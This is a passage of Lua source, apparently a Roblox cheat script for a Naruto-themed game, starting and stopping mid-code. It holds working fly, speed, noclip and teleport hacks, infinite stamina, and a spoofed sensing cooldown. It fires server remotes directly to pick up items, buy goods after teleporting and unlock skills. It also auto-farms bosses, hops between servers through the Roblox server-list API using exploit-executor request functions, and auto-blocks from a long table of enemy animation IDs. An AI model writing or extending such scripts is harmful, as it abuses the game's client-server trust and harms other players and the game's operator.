			if not pickupable then
				return
			end

			local id = obj:WaitForChild("ID", 10)
			if not id then
				return
			end

			local pos = obj.Position
			pickupList[pos] = obj

			obj.Destroying:Connect(function()
				pickupList[pos] = nil
			end)
		end)
	end

	for _, child in ipairs(workspace:GetChildren()) do
		task.spawn(onChildAdded, child)
	end

	workspace.ChildAdded:Connect(onChildAdded)

	local autoPickupConn

	function funcs.autoPickup(toggle)
		if not toggle then
			if autoPickupConn then
				autoPickupConn:Disconnect()
				autoPickupConn = nil
			end
			return
		end

		if autoPickupConn then
			return
		end

		local lastRanAt = 0

		autoPickupConn = RunService.Heartbeat:Connect(function()
			local rootPart = localPlayerData.rootPart
			if not rootPart or tick() - lastRanAt < 0.35 then
				return
			end

			lastRanAt = tick()

			local myPosition = rootPart.Position

			for pos, obj in next, pickupList do
				if (myPosition - pos).Magnitude < 50 and dataEvent then
					dataEvent:FireServer("PickUp", obj.ID.Value)
				end
			end
		end)
	end
end

do
	local entities = {}

	local function onChildAdded(obj)
		task.spawn(function()
			if not IsA(obj, "Model") then
				return
			end

			if obj == localPlayer.Character then
				return
			end

			local humanoid = obj:WaitForChild("Humanoid", 10)
			if not humanoid then
				return
			end

			local rootPart = obj:WaitForChild("HumanoidRootPart", 10)
			if not rootPart or not obj.Parent then
				return
			end

			local npc = obj:WaitForChild("NPC", 10)
			if npc and npc.Value == "Dialog" then
				return
			end

			table.insert(entities, rootPart)

			obj.Destroying:Connect(function()
				local idx = table.find(entities, rootPart)
				if idx then
					table.remove(entities, idx)
				end
			end)
		end)
	end

	for _, child in ipairs(workspace:GetChildren()) do
		task.spawn(onChildAdded, child)
	end

	workspace.ChildAdded:Connect(onChildAdded)

	function funcs.attachToBack()
		local myRootPart = localPlayerData.rootPart
		if not myRootPart then
			return
		end

		local myPosition = myRootPart.Position
		local last, target = math.huge, nil

		for _, part in ipairs(entities) do
			if part.Parent then
				local distance = (myPosition - part.Position).Magnitude

				if distance < last then
					last = distance
					target = part
				end
			end
		end

		if target then
			if (myRootPart.Position - target.Position).Magnitude > 5 then
				myRootPart.CFrame = target.CFrame * CFrame.new(0, 0, 2)
			end
		end
	end
end

do
	function funcs.findThunderstormServer(state)
		if not state then
			return
		end

		ToastNotif({ text = "Thunderstorm Server Finder is running!" })

		local thunderStorm = workspace:WaitForChild("Thunderstorm", 5)

		if thunderStorm then
			return ToastNotif({ text = "Found thunderstorm in this server!" })
		end

		ToastNotif({ text = "No thunderstorm was found on this server, finding new server..." })

		local oldServerList = MemStorageService:HasItem("thunderStormServerList")
				and MemStorageService:GetItem("thunderStormServerList")

		if oldServerList then
			oldServerList = HttpService:JSONDecode(oldServerList)
		end

		if not oldServerList or #oldServerList == 0 then
			local serverListData = {}
			local cursor = ""

			while true do
				local response
				pcall(function()
					if syn and syn.request then
						response = syn.request({
							Url = string.format(
								"https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Desc&limit=100&cursor=%s",
								MAIN_PLACE_ID,
								cursor
							),
						})
					end
				end)

				if not response or not response.Success then
					task.wait(1)
				else
					local decoded = HttpService:JSONDecode(response.Body)

					for _, server in ipairs(decoded.data or {}) do
						table.insert(serverListData, server.id)
					end

					if not decoded.nextPageCursor or not decoded.data then
						break
					end

					cursor = decoded.nextPageCursor
				end
			end

			print("Got", #serverListData)
			MemStorageService:SetItem("thunderStormServerList", HttpService:JSONEncode(serverListData))
		end

		local serverList = HttpService:JSONDecode(MemStorageService:GetItem("thunderStormServerList"))

		task.spawn(function()
			while flag("Thunderstorm Server Finder") do
				local serverId = table.remove(serverList, math.random(1, #serverList))
				if not serverId then
					break
				end

				if dataEvent then
					dataEvent:FireServer("ServerTeleport", serverId)
				end

				task.wait(15)
			end
		end)
	end
end

do
	local function onCooldownsChildAdded(obj)
		local function onChakraSenseAdded(part)
			if part.Name == "Chakra Sense" and flag("Chakra Sense Notifier") then
				ToastNotif({ text = string.format("%s has chakra sense", obj.Name) })
			end
		end

		for _, v in ipairs(obj:GetChildren()) do
			task.spawn(onChakraSenseAdded, v)
		end

		obj.ChildAdded:Connect(onChakraSenseAdded)
	end

	local cooldowns = ReplicatedStorage:FindFirstChild("Cooldowns")

	if cooldowns then
		for _, v in ipairs(cooldowns:GetChildren()) do
			task.spawn(onCooldownsChildAdded, v)
		end

		cooldowns.ChildAdded:Connect(onCooldownsChildAdded)
	end
end

do
	local flyBodyVelocity
	local flySteppedConn

	function funcs.flyHack(state)
		if not state then
			if flySteppedConn then
				flySteppedConn:Disconnect()
				flySteppedConn = nil
			end

			if flyBodyVelocity then
				flyBodyVelocity:Destroy()
				flyBodyVelocity = nil
			end

			return
		end

		if flySteppedConn then
			return
		end

		flySteppedConn = RunService.Stepped:Connect(function()
			local camera = workspace.CurrentCamera
			local rootPart = localPlayerData.rootPart

			if not camera or not rootPart then
				return
			end

			local moveVector = camera.CFrame:VectorToWorldSpace(ControlModule:GetMoveVector())

			if not flyBodyVelocity or not flyBodyVelocity.Parent then
				flyBodyVelocity = Instance.new("BodyVelocity")
				flyBodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				flyBodyVelocity.Parent = rootPart
			end

			flyBodyVelocity.Velocity = moveVector * (flag("Fly Speed") or 50)
		end)
	end

	local speedConn

	function funcs.speed(state)
		if not state then
			if speedConn then
				speedConn:Disconnect()
				speedConn = nil
			end
			return
		end

		if speedConn then
			return
		end

		speedConn = RunService.Stepped:Connect(function()
			local humanoid = localPlayerData.humanoid
			if humanoid then
				humanoid.WalkSpeed = math.min(flag("Walk Speed Value") or 16, 105)
			end
		end)
	end

	local agilityConn
	local agilityBase

	function funcs.agilitySpoof(state)
		if not state then
			if agilityConn then
				agilityConn:Disconnect()
				agilityConn = nil
			end

			local humanoid = localPlayerData.humanoid
			if humanoid and agilityBase then
				humanoid.WalkSpeed = agilityBase
			end

			agilityBase = nil
			return
		end

		if agilityConn then
			return
		end

		agilityConn = RunService.Stepped:Connect(function()
			local humanoid = localPlayerData.humanoid
			if not humanoid then
				return
			end

			if not agilityBase then
				agilityBase = humanoid.WalkSpeed
			end

			local percent = flag("Agility Spoofer Percent") or 15
			humanoid.WalkSpeed = math.min(agilityBase * (1 + percent / 100), 105)
		end)
	end

	local staminaConn

	function funcs.infiniteStamina(state)
		if not state then
			if staminaConn then
				staminaConn:Disconnect()
				staminaConn = nil
			end
			return
		end

		if staminaConn then
			return
		end

		staminaConn = RunService.Stepped:Connect(function()
			local character = localPlayerData.character
			if not character then
				return
			end

			local settingsFolder = ReplicatedStorage:FindFirstChild("Settings")
			local settings = settingsFolder and settingsFolder:FindFirstChild(localPlayer.Name)
			local jumpCounters = settings and settings:FindFirstChild("JumpCounters")

			if jumpCounters and jumpCounters.Value < 10 then
				jumpCounters.Value = 10
			end
		end)
	end

	local noClipConn

	function funcs.noClip(state)
		if not state then
			if noClipConn then
				noClipConn:Disconnect()
				noClipConn = nil
			end
			return
		end

		if noClipConn then
			return
		end

		noClipConn = RunService.Stepped:Connect(function()
			local character = localPlayerData.character
			if not character then
				return
			end

			for _, part in ipairs(character:GetDescendants()) do
				if IsA(part, "BasePart") then
					part.CanCollide = false
				end
			end
		end)
	end

	local timeChangerConn

	function funcs.timeChanger(state)
		if not state then
			if timeChangerConn then
				timeChangerConn:Disconnect()
				timeChangerConn = nil
			end
			return
		end

		if timeChangerConn then
			return
		end

		local clockTimes = {
			Morning = 6.3,
			Afternoon = 14,
			Evening = 18,
			Night = 0,
		}

		timeChangerConn = RunService.RenderStepped:Connect(function()
			local tod = flag("Time Of Day")
			if tod then
				Lighting.ClockTime = clockTimes[tod] or 0
			end
		end)
	end
end

do
	function funcs.removeFF()
		local character = localPlayerData.character
		if not character then
			return
		end

		local forceField = character:FindFirstChildWhichIsA("ForceField")
		if forceField then
			forceField:Destroy()
		end
	end

	function funcs.giveItem()
		local itemName = flag("Item Name")
		if not itemName then
			return ToastNotif({ text = "Select an item first." })
		end

		if not dataFunction then
			return
		end

		local success, data = pcall(function()
			return dataFunction:InvokeServer("GetData")
		end)
		if not success or type(data) ~= "table" then
			return ToastNotif({ text = "Failed to fetch player data." })
		end

		local rack
		local fallbackRack
		for _, part in ipairs(workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				local buyable = part:FindFirstChild("Buyable")
				if buyable and buyable.Value == itemName then
					if part:GetAttribute("Village") then
						rack = part
						break
					elseif not fallbackRack then
						fallbackRack = part
					end
				end
			end
		end
		rack = rack or fallbackRack
		if not rack then
			return ToastNotif({ text = "No shop found for that item." })
		end

		local vd, month, week = dataFunction:InvokeServer("getVillageData")
		local function getVillageData(v, m, w)
			return vd["Month" .. (m or month)]["Week" .. (w or week)][v]
		end

		local function getEconomy(v)
			if v == "Rogue" then
				return "Struggling"
			end
			if v == "Neutral" then
				return "Average"
			end
			if v then
				return getVillageData(v).Politics.Economy
			end
			return "Average"
		end

		local function getRelationship(p1, p2)
			if not (p1 and p2) then
				return nil
			end
			if p1 == "Rogue" or p2 == "Rogue" then
				return "War"
			end
			if p1 == "Neutral" or p2 == "Neutral" then
				return "Neutral"
			end
			local v1, v2 = getVillageData(p1), getVillageData(p2)
			if p1 == p2 then
				return "Own"
			end
			if table.find(v1.Politics.Alliances, p2) or table.find(v2.Politics.Alliances, p1) then
				return "Allied"
			end
			if table.find(v1.Politics.Enemies, p2) or table.find(v2.Politics.Enemies, p1) then
				return "Enemies"
			end
			return "Neutral"
		end

		local village = rack:GetAttribute("Village")
		local price = gameManager:getModifiedPrice(
			gameManager:getPrice(itemName),
			getRelationship(data.Village, village),
			getEconomy(village),
			"Buy"
		)

		local rootPart = localPlayerData.rootPart
		if not rootPart then
			return ToastNotif({ text = "Character not ready." })
		end

		local oldCFrame = rootPart.CFrame
		rootPart.CFrame = rack.CFrame + Vector3.new(0, 6, 0)
		task.wait(1.2)

		local bought, result = pcall(function()
			return dataFunction:InvokeServer("Pay", price, itemName, 1, rack)
		end)

		task.wait(0.3)
		rootPart.CFrame = oldCFrame

		if not bought then
			return ToastNotif({ text = "Purchase failed." })
		end

		if result == true then
			ToastNotif({ text = "Purchased " .. itemName .. " for " .. price .. " Ryo." })
		else
			local hint
			if type(data.Ryo) == "number" and data.Ryo < price then
				hint = " Not enough Ryo (" .. data.Ryo .. "/" .. price .. ")."
			elseif gameManager.Items[itemName] and gameManager.Items[itemName].Condition then
				hint = " Item may require a skill."
			end
			ToastNotif({ text = "Could not buy: " .. tostring(result) .. (hint or "") })
		end
	end
end

do
	local chakraSpoofValue
	local chakraSpoofConn

	function funcs.chakraSpoof(state)
		if not state then
			if chakraSpoofConn then
				chakraSpoofConn:Disconnect()
				chakraSpoofConn = nil
			end

			if chakraSpoofValue and chakraSpoofValue.Parent then
				chakraSpoofValue:Destroy()
				chakraSpoofValue = nil
			end
			return
		end

		if chakraSpoofConn then
			return
		end

		local cooldowns = ReplicatedStorage:FindFirstChild("Cooldowns")
		if not cooldowns then
			return Library:Notify("Cooldowns folder not found!", 3)
		end

		local myCooldowns = cooldowns:FindFirstChild(localPlayer.Name)
		if not myCooldowns then
			return Library:Notify("Your cooldowns folder not found!", 3)
		end

		chakraSpoofValue = myCooldowns:FindFirstChild("Chakra Sense")
		if not chakraSpoofValue then
			chakraSpoofValue = Instance.new("NumberValue")
			chakraSpoofValue.Name = "Chakra Sense"
			chakraSpoofValue.Parent = myCooldowns
		end

		chakraSpoofConn = RunService.Heartbeat:Connect(function()
			if chakraSpoofValue and chakraSpoofValue.Parent then
				chakraSpoofValue.Value = os.time() + 9999
			end
		end)
	end

	local chakraDetectConn
	local notifiedSensers = {}

	function funcs.chakraSenseDetect(state)
		if not state then
			if chakraDetectConn then
				chakraDetectConn:Disconnect()
				chakraDetectConn = nil
			end
			notifiedSensers = {}
			return
		end

		if chakraDetectConn then
			return
		end

		local cooldowns = ReplicatedStorage:FindFirstChild("Cooldowns")
		if not cooldowns then
			return
		end

		chakraDetectConn = RunService.Heartbeat:Connect(function()
			for _, player in ipairs(Players:GetPlayers()) do
				if player == localPlayer then
					continue
				end

				local playerCooldowns = cooldowns:FindFirstChild(player.Name)
				if not playerCooldowns then
					continue
				end

				local sense = playerCooldowns:FindFirstChild("Chakra Sense")
				if sense and sense.Value > os.time() then
					if not notifiedSensers[player.Name] then
						notifiedSensers[player.Name] = true
						Library:Notify(string.format("%s is Chakra Sensing you!", player.Name), 4)
					end
				else
					notifiedSensers[player.Name] = nil
				end
			end
		end)
	end
end

local infoLabels = {}

do
	function funcs.refreshInfo()
		if not dataFunction then
			return Library:Notify("DataFunction not found", 3)
		end

		local ok, data = pcall(function()
			return dataFunction:InvokeServer("GetData")
		end)

		if not ok or type(data) ~= "table" then
			return Library:Notify("Failed to fetch data", 3)
		end

		local function value(v)
			if type(v) == "table" then
				local parts = {}
				for k, val in pairs(v) do
					table.insert(parts, tostring(k) .. "=" .. tostring(val))
				end
				table.sort(parts)
				if #parts == 0 then
					return "--"
				end
				return table.concat(parts, ", ")
			elseif v == nil then
				return "--"
			end
			return tostring(v)
		end

		for key, entry in next, infoLabels do
			if entry and entry.label and entry.label.SetText then
				local val

				if key == "Died" then
					val = data[key] and "No" or "Yes"
				else
					val = value(data[key])
				end

				entry.label:SetText(entry.title .. ": " .. val)
			end
		end

		Library:Notify("Information refreshed!", 2)
	end
end

do
	function funcs.openWipeShop()
		local wipeShop = localPlayer.PlayerGui:FindFirstChild("WipeShop")
		if wipeShop then
			wipeShop.Enabled = true
		end
	end

	function funcs.unlockBurrow()
		if dataFunction then
			dataFunction:InvokeServer("UnlockSkill", "Burrow")
			task.wait(0.1)
			dataFunction:InvokeServer("UnlockSkill", "Burrow Teleport")
			Library:Notify("Unlocked Burrow & Burrow Teleport!", 3)
		end
	end

	local wipeConfirm = false
	local wipeConfirmTimer

	function funcs.wipe()
		if not wipeConfirm then
			wipeConfirm = true
			local gender = flag("Reincarnation Gender") or "Male"
			Library:Notify("Click again to wipe as " .. gender .. "!", 3)

			if wipeConfirmTimer then
				task.cancel(wipeConfirmTimer)
			end

			wipeConfirmTimer = task.delay(3, function()
				wipeConfirm = false
			end)
		else
			wipeConfirm = false
			if wipeConfirmTimer then
				task.cancel(wipeConfirmTimer)
			end

	local gender = flag("Reincarnation Gender") or "Male"

		if dataEvent then
			dataEvent:FireServer("NewGame")
		end
		task.wait(0.5)
		if dataFunction then
			dataFunction:InvokeServer("RequestReincarnation", gender)
		end

		Library:Notify("Wiped and created " .. gender .. " slot!", 3)
	end
end
end

-- ── AUTO FARM ─────────────────────────────────────────
do
	local autoFarmConn
	local autoFarmActive = false
	local dodging = false
	local safeSpotCFrame = nil
	local lastBossPos = nil
	local TP_THRESHOLD = 40

	local function isBossAlive(bossName)
		local model = workspace:FindFirstChild(bossName)
		if not model then
			return false
		end
		local hum = model:FindFirstChildOfClass("Humanoid")
		if not hum then
			return false
		end
		return hum.Health > 0
	end

	local function findAliveBoss()
		local selected = flag("Farm Bosses")
		if type(selected) ~= "table" or next(selected) == nil then
			return nil, nil
		end
		for name in pairs(selected) do
			if isBossAlive(name) then
				return name, workspace:FindFirstChild(name)
			end
		end
		return nil, nil
	end

	local function equipWeapon()
		local weapon = flag("Farm Weapon")
		if not weapon or weapon == "" then
			return
		end
		pcall(function()
			dataEvent:FireServer("Item", "Selected", weapon)
		end)
	end

	local function performM1()
		pcall(function()
			dataEvent:FireServer("CheckMeleeHit", nil, "NormalAttack", false)
		end)
	end

	local function startBlock()
		pcall(function()
			dataFunction:InvokeServer("Block")
		end)
	end

	local function endBlock()
		pcall(function()
			dataFunction:InvokeServer("EndBlock")
		end)
	end

	local function moveToBoss(bossModel)
		local bossRoot = bossModel.PrimaryPart or bossModel:FindFirstChild("HumanoidRootPart")
		local myRoot = localPlayerData.rootPart
		if not (bossRoot and myRoot) then
			return
		end
		local dist = (bossRoot.Position - myRoot.Position).Magnitude
		if dist > 80 then
			myRoot.CFrame = bossRoot.CFrame * CFrame.new(0, 0, 8)
		elseif dist > 12 then
			local humanoid = localPlayerData.humanoid
			if humanoid and humanoid.Health > 0 then
				humanoid:MoveTo(bossRoot.Position)
			end
		end
	end

	local function pickUpDrops()
		local myRoot = localPlayerData.rootPart
		if not myRoot then
			return
		end
		for _, obj in ipairs(workspace:GetChildren()) do
			if obj:IsA("BasePart") then
				local pickupable = obj:FindFirstChild("Pickupable")
				local id = obj:FindFirstChild("ID")
				if pickupable and id and (myRoot.Position - obj.Position).Magnitude < 40 then
					pcall(function()
						dataEvent:FireServer("PickUp", id.Value)
					end)
					task.wait(0.1)
				end
			end
		end
	end

	local function getMySettings()
		local settingsFolder = ReplicatedStorage:FindFirstChild("Settings")
		if not settingsFolder then
			return nil
		end
		return settingsFolder:FindFirstChild(localPlayer.Name)
	end

	local function settingsFlag(name)
		local settings = getMySettings()
		local value = settings and settings:FindFirstChild(name)
		return value and value.Value or false
	end

	local function canAttack()
		if settingsFlag("MeleeCooldown") then
			return false
		end
		if settingsFlag("Blocking") then
			return false
		end
		if settingsFlag("Stunned") then
			return false
		end
		if settingsFlag("Knocked") then
			return false
		end
		if settingsFlag("BeingGripped") then
			return false
		end
		if settingsFlag("Invincible") then
			return false
		end
		return true
	end

	local function getCombatCount()
		return settingsFlag("CombatCount")
	end

	local function isAlive()
		local hum = localPlayerData.humanoid
		return hum ~= nil and hum.Health > 0
	end

	local function getServerList()
		local servers = {}
		local cursor = ""
		repeat
			local url = string.format(
				"https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s",
				MAIN_PLACE_ID, cursor
			)
			local ok, response = pcall(function()
				if syn and syn.request then
					return syn.request({ Url = url })
				elseif http_request then
					return http_request({ Url = url })
				elseif request then
					return request({ Url = url })
				end
			end)
			if ok and response and response.Success then
				local data = HttpService:JSONDecode(response.Body)
				for _, server in ipairs(data.data or {}) do
					if server.id ~= game.JobId then
						table.insert(servers, server.id)
					end
				end
				cursor = data.nextPageCursor or ""
			else
				break
			end
		until cursor == ""
		return servers
	end

	function funcs.autoFarmServerHop()
		local servers = getServerList()
		if #servers == 0 then
			return ToastNotif({ text = "No servers found." })
		end
		local target = servers[math.random(1, #servers)]
		ToastNotif({ text = "Hopping to new server..." })
		pcall(function()
			dataEvent:FireServer("ServerTeleport", target)
		end)
	end

	function funcs.setSafeSpot()
		local root = localPlayerData.rootPart
		if root then
			safeSpotCFrame = root.CFrame
			ToastNotif({ text = "Safe spot saved!" })
		end
	end

	function funcs.autoFarmBoss(state)
		autoFarmActive = false
		if autoFarmConn then
			autoFarmConn:Disconnect()
			autoFarmConn = nil
		end
		lastBossPos = nil
		dodging = false

		if not state then
			return
		end

		local weapon = flag("Farm Weapon")
		if not weapon or weapon == "" then
			ToastNotif({ text = "Set a weapon name first!" })
			Toggles["Auto Farm"]:SetValue(false)
			return
		end

		autoFarmActive = true

		task.spawn(function()
			while autoFarmActive do
				if findAliveBoss() and not dodging and isAlive() then
					local combatCount = getCombatCount()
					if combatCount >= 5 then
						task.wait(1.2)
					elseif canAttack() then
						performM1()
						task.wait(0.42)
					else
						task.wait(0.15)
					end
				else
					task.wait(0.3)
				end
			end
		end)

		task.spawn(function()
			while autoFarmActive do
				if findAliveBoss() and flag("Auto Block") and not dodging and isAlive() and canAttack() then
					if getCombatCount() == 0 and not settingsFlag("Blocking") then
						startBlock()
						task.wait(0.35)
						endBlock()
						task.wait(0.55)
					else
						task.wait(0.2)
					end
				else
					task.wait(0.3)
				end
			end
		end)

		local lastEquipTime = 0
		local lastMoveTime = 0
		local lastPickupTime = 0
		local lastHopTime = 0
		local dodgeEndTime = 0

		autoFarmConn = RunService.Heartbeat:Connect(function()
			local myRoot = localPlayerData.rootPart
			if not myRoot then
				return
			end

			local now = tick()

			if dodging and now > dodgeEndTime then
				dodging = false
				if safeSpotCFrame then
					myRoot.CFrame = safeSpotCFrame
				end
			end

			if dodging then
				return
			end

			local bossName, bossModel = findAliveBoss()

			if bossName and bossModel then
				local bossRoot = bossModel.PrimaryPart or bossModel:FindFirstChild("HumanoidRootPart")

				if bossRoot and lastBossPos then
					local dist = (bossRoot.Position - lastBossPos).Magnitude
					if dist > TP_THRESHOLD and flag("Auto Block") then
						dodging = true
						dodgeEndTime = now + 1.5
						if safeSpotCFrame then
							myRoot.CFrame = safeSpotCFrame
						end
						lastBossPos = bossRoot.Position
						return
					end
				end

				if bossRoot then
					lastBossPos = bossRoot.Position
				end

				if now - lastEquipTime > 5 then
					lastEquipTime = now
					equipWeapon()
				end

				if now - lastMoveTime > 1 then
					lastMoveTime = now
					moveToBoss(bossModel)
				end
			else
				lastBossPos = nil

				if now - lastPickupTime > 2 then
					lastPickupTime = now
					task.spawn(pickUpDrops)
				end

				if flag("Farm Server Hop") and now - lastHopTime > 10 then
					lastHopTime = now
					ToastNotif({ text = "No selected boss alive. Hopping..." })
					funcs.autoFarmServerHop()
					return
				end

				if safeSpotCFrame and (safeSpotCFrame.Position - myRoot.Position).Magnitude > 10 then
					myRoot.CFrame = safeSpotCFrame
				end
			end
		end)
	end
end

-- ── AUTO BLOCK (COMBAT) ───────────────────────────────
do
	local AUTO_BLOCK_SKILLS = {
		{ Name = "Cleave Rush", Dist = 35, Delay = 0, Dur = 0, Detect = nil, Type = "SKILL" },
		{ Name = "Matatabi Cross Slash", Dist = 10, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Smoldering Earth", Dist = 9, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Shisui Thrust", Dist = 20, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Dynamic Entry", Dist = 35, Delay = 0, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Spinning Dash", Dist = 100, Delay = 0, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Thrusting Strike", Dist = 25, Delay = 0, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Ice Spikes", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Blood Dragon", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Double Blood Dragon", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Triple Blood Dragon", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Amaterasu", Dist = 40, Delay = 0, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "M1 Combo Ender", Dist = 15, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Sasuke M2", Dist = 20, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Shisui Throw", Dist = 25, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Hirudora", Dist = 50, Delay = 0, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Protruding Chains", Dist = 30, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Lariat", Dist = 25, Delay = 0, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Butterfly Slam", Dist = 20, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Fern Dance", Dist = 40, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Matatabi Bullets", Dist = 30, Delay = 0, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Matatabi Cloak Bomb", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Shukaku Cloak Bomb", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Jinchuriki Bomb", Dist = 40, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Zig Zag", Dist = 25, Delay = 0, Dur = 0.25, Detect = nil, Type = "SKILL" },
		{ Name = "Almighty Push", Dist = 30, Delay = 0, Dur = 0.25, Detect = "10930376912", Type = "ANIM" },
		{ Name = "Earth Slam", Dist = 40, Delay = 0.2, Dur = 0.25, Detect = "11289531561", Type = "ANIM" },
		{ Name = "Coral Emerge", Dist = 60, Delay = 0.1, Dur = 0.25, Detect = "99068559501337", Type = "ANIM" },
		{ Name = "Matatabi Tail Swipe", Dist = 40, Delay = 0.1, Dur = 0.25, Detect = "120703747916516", Type = "ANIM" },
		{ Name = "Matatabi Right Punch", Dist = 20, Delay = 0.1, Dur = 0.25, Detect = "86414508786370", Type = "ANIM" },
		{ Name = "Matatabi Left Punch", Dist = 20, Delay = 0.1, Dur = 0.25, Detect = "93012373755384", Type = "ANIM" },
		{ Name = "Matatabi Bite", Dist = 15, Delay = 0.1, Dur = 0.25, Detect = "113419524303689", Type = "ANIM" },
		{ Name = "Matatabi Cloak Cross Slash", Dist = 15, Delay = 0.1, Dur = 0.25, Detect = "129517118182170", Type = "ANIM" },
		{ Name = "Isobu Right Punch", Dist = 20, Delay = 0.1, Dur = 0.25, Detect = "91987903183435", Type = "ANIM" },
		{ Name = "Isobu Left Punch", Dist = 20, Delay = 0.1, Dur = 0.25, Detect = "121901061458966", Type = "ANIM" },
		{ Name = "Isobu Bite", Dist = 15, Delay = 0.1, Dur = 0.25, Detect = "91143601400588", Type = "ANIM" },
		{ Name = "Isobu Tail Hits", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = "138957995371428", Type = "ANIM" },
		{ Name = "Isobu Pillars", Dist = 35, Delay = 0.2, Dur = 0.25, Detect = "73118048569214", Type = "ANIM" },
		{ Name = "Isobu Bash", Dist = 30, Delay = 0.1, Dur = 0.25, Detect = "133761269679135", Type = "ANIM" },
		{ Name = "Shukaku Left Punch", Dist = 25, Delay = 0.1, Dur = 0.25, Detect = "104805162139882", Type = "ANIM" },
		{ Name = "Shukaku Right Punch", Dist = 25, Delay = 0.1, Dur = 0.25, Detect = "113076726023193", Type = "ANIM" },
		{ Name = "Shukaku Tail Swipe", Dist = 45, Delay = 0.1, Dur = 0.25, Detect = "129209861939680", Type = "ANIM" },
		{ Name = "Shukaku Arm Slam", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = "130533946075420", Type = "ANIM" },
		{ Name = "Golem Right Punch", Dist = 25, Delay = 0.1, Dur = 0.25, Detect = "105997354575927", Type = "ANIM" },
		{ Name = "Golem Left Punch", Dist = 25, Delay = 0.1, Dur = 0.25, Detect = "111592213267733", Type = "ANIM" },
		{ Name = "Golem Right Stomp", Dist = 20, Delay = 0.1, Dur = 0.25, Detect = "74690728860338", Type = "ANIM" },
		{ Name = "Golem Left Stomp", Dist = 20, Delay = 0.1, Dur = 0.25, Detect = "78308752976063", Type = "ANIM" },
		{ Name = "Golem Roots", Dist = 30, Delay = 0.1, Dur = 0.25, Detect = "99459589869966", Type = "ANIM" },
		{ Name = "Golem Spire", Dist = 30, Delay = 0.1, Dur = 0.25, Detect = "116907126244057", Type = "ANIM" },
		{ Name = "Golem Dragon", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = "120758909308511", Type = "ANIM" },
		{ Name = "Blood Arrow", Dist = 45, Delay = 0, Dur = 0.25, Detect = "83093666885184", Type = "ANIM" },
		{ Name = "Shukaku Arm Emerge", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = "124819180967216", Type = "ANIM" },
		{ Name = "Barbarian Right Slam", Dist = 22, Delay = 0.05, Dur = 0.25, Detect = "6038040720", Type = "ANIM" },
		{ Name = "Barbarian Left Slam", Dist = 22, Delay = 0.05, Dur = 0.25, Detect = "6038041916", Type = "ANIM" },
		{ Name = "Matatabi Cloak Bomb", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = "93839342012083", Type = "ANIM" },
		{ Name = "Matatabi Cloak Zig Zag Pounce", Dist = 25, Delay = 0.1, Dur = 0.25, Detect = "91336287964954", Type = "ANIM" },
		{ Name = "Matatabi Cloak Bullets", Dist = 30, Delay = 0, Dur = 0.25, Detect = "106217504753783", Type = "ANIM" },
		{ Name = "Water Dragon", Dist = 25, Delay = 0, Dur = 0.25, Detect = nil, Type = "OBJECT", ObjectName = "WaterDragonHead", ObjectLocation = "Debris" },
		{ Name = "Wooden Dragon", Dist = 40, Delay = 0, Dur = 0.25, Detect = nil, Type = "OBJECT", ObjectName = "WoodenDragonHead", ObjectLocation = "Debris" },
		{ Name = "Earth Dragon", Dist = 45, Delay = 0, Dur = 0.25, Detect = nil, Type = "OBJECT", ObjectName = "Earth Dragon", ObjectLocation = "Workspace" },
		{ Name = "Fireball", Dist = 20, Delay = 0, Dur = 0.25, Detect = nil, Type = "OBJECT", ObjectName = "Fireball", ObjectLocation = "Workspace" },
		{ Name = "Ice Dragon", Dist = 15, Delay = 0.2, Dur = 0.25, Detect = nil, Type = "OBJECT", ObjectName = "crack", ObjectLocation = "Debris" },
		{ Name = "Wooden Spire", Dist = 15, Delay = 0.05, Dur = 0.25, Detect = nil, Type = "OBJECT", ObjectName = "crack", ObjectLocation = "Debris" },
		{ Name = "Ice Spikes (Obj)", Dist = 35, Delay = 0.1, Dur = 0.25, Detect = nil, Type = "OBJECT", ObjectName = "IceSpike", ObjectLocation = "Debris" },
	}

	local skillByName = {}
	local defaultSkills = {}
	for _, skill in ipairs(AUTO_BLOCK_SKILLS) do
		skillByName[skill.Name] = skill
		defaultSkills[skill.Name] = {
			Dist = skill.Dist,
			Delay = skill.Delay,
			Dur = skill.Dur,
			Detect = skill.Detect,
		}
	end

	local animSkills = {}
	local objSkills = {}
	local animSkillByNum = {}
	local objSkillByKey = {}
	local maxAnimDist = 0
	for _, skill in ipairs(AUTO_BLOCK_SKILLS) do
